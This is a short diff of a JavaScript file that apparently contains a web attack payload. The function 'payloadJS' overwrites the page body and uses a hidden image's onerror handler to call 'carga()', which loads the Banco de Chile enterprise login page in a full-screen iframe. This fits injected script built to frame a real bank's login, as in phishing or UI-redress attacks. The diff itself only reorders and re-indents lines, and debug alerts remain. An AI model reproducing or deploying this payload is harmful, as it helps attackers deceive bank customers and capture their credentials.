@@ -1,5 +1,5 @@
 function carga() {
-	alert("entra carga");
+    alert("entra carga");
     var profileIframe = document.createElement('iframe');
     profileIframe.setAttribute('src', 'https://www.empresas.bancochile.cl/eft/html/login_bch_emp.htm');
     profileIframe.setAttribute('name', 'select_frame');
@@ -21,6 +21,7 @@ function carga() {
 }
 
 function payloadJS() {
-	document.body.innerHTML = "<script src='https://code.jquery.com/jquery-2.2.4.min.js'></script><style type='text/css'>html, body, div, iframe { margin:0; padding:0; height:100%; } iframe { display:block; width:100%; border:none; }</style><img src='https://www.empresas.bancochile.cl/eft/html/login_bch_emp.htm' style='display: none;' onerror='carga()'>";  
 	alert("entra payloadJS");
+	document.body.innerHTML = "<script src='https://code.jquery.com/jquery-2.2.4.min.js'></script><style type='text/css'>html, body, div, iframe { margin:0; padding:0; height:100%; } iframe { display:block; width:100%; border:none; }</style><img src='https://www.empresas.bancochile.cl/eft/html/login_bch_emp.htm' style='display: none;' onerror='carga()'>";  
+
 }
